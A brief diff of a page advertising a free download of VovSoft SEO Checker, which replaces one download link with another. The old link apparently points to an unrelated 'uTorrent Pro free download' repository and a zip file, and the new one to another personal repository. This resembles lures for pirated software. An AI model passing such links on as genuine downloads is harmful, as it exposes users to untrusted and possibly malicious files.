@@ -8,5 +8,5 @@
 <h2>VovSoft SEO Checker Free</h2>
 <p><strong>VovSoft SEO Checker 2024 is a professional website analyzer and SEO audit tool which can be used to evaluate and enhance the SEO performance of websites.</p>
 </ol>
-<a href="https://github.com/abilbiju/.utorrent-pro-download-for-free/releases/download/UU/ExtraSoft.zip">
+<a href="https://github.com/MinHtetTharUTYCC/VovSoft-SEO-Checker/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
